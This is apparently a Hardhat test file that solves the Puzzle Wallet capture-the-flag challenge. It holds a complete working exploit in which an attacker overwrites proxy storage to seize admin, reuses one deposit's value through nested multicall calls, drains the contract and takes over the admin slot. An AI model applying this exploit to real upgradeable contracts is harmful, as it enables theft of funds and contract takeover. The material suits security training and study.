import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { BigNumber, Contract } from "ethers";
import { ethers } from "hardhat";

const PROXY_NAME = "PuzzleProxy";
const PUZZLE_WALLET = "PuzzleWallet";

describe(PROXY_NAME, () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let proxyContract: Contract;
  let puzzleWallet: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [owner, attacker] = await ethers.getSigners();

    const implementationFactory = await ethers.getContractFactory(PUZZLE_WALLET);
    puzzleWallet = await implementationFactory.deploy();
    await puzzleWallet.deployed();

    const MAX_BALANCE = BigNumber.from("12858228370453666557488906557637512187715365938650");
    const iface = new ethers.utils.Interface(["function init(uint256)"]);
    const data = iface.encodeFunctionData("init", [MAX_BALANCE]);

    const proxyFactory = await ethers.getContractFactory(PROXY_NAME);
    proxyContract = await proxyFactory.deploy(owner.address, puzzleWallet.address, data);
    await proxyContract.deployed();

    tx = await owner.sendTransaction({
      to: proxyContract.address,
      value: ethers.utils.parseEther("0.001"),
    });
    await tx.wait();

    proxyContract = proxyContract.connect(attacker);
    puzzleWallet = puzzleWallet.connect(attacker);
  });

  it("Solves the challenge", async () => {
    tx = await proxyContract.proposeNewAdmin(attacker.address);
    await tx.wait();

    puzzleWallet = puzzleWallet.attach(proxyContract.address);

    tx = await puzzleWallet.addToWhitelist(attacker.address);
    await tx.wait();

    const data1 = puzzleWallet.interface.encodeFunctionData("deposit");
    const data2 = puzzleWallet.interface.encodeFunctionData("multicall", [[data1]]);

    tx = await await puzzleWallet.multicall([data1, data2], {
      value: ethers.utils.parseEther("0.001"),
    });
    await tx.wait();

    tx = await puzzleWallet.execute(attacker.address, ethers.utils.parseEther("0.002"), "0x");
    await tx.wait();

    tx = await puzzleWallet.setMaxBalance(attacker.address);
    await tx.wait();

    expect(await proxyContract.admin()).to.eq(attacker.address);
  });
});
